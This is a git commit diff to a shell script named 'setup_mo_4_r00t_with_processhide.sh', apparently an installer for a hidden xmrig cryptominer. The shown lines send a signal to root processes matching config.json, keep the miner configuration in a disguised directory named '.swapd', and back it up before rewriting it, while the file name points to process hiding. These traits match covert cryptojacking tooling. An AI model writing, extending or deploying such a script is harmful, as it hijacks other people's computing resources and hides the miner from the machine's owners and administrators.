73d25b4e1cc22fd2c2f3d6cf98e1b2a6bde04f5b
littlAcen <113854209+littlAcen@users.noreply.github.com>
2024-02-06 06:17:41 +0100

    Update setup_mo_4_r00t_with_processhide.sh

--- setup_mo_4_r00t_with_processhide.sh
+++ setup_mo_4_r00t_with_processhide.sh
@@ -432,11 +432,11 @@ fi
 
 kill -31 $(pgrep -f -u root config.json)
 
-# echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
+echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
 
 echo "[*] Copying xmrig-proxy config"
 
-rm $HOME/.swapd/config.json
+cp $HOME/.swapd/config.json $HOME/.swapd/config_ORiG.json
 
 cat $HOME/.swapd/config.json <<EOL
 {
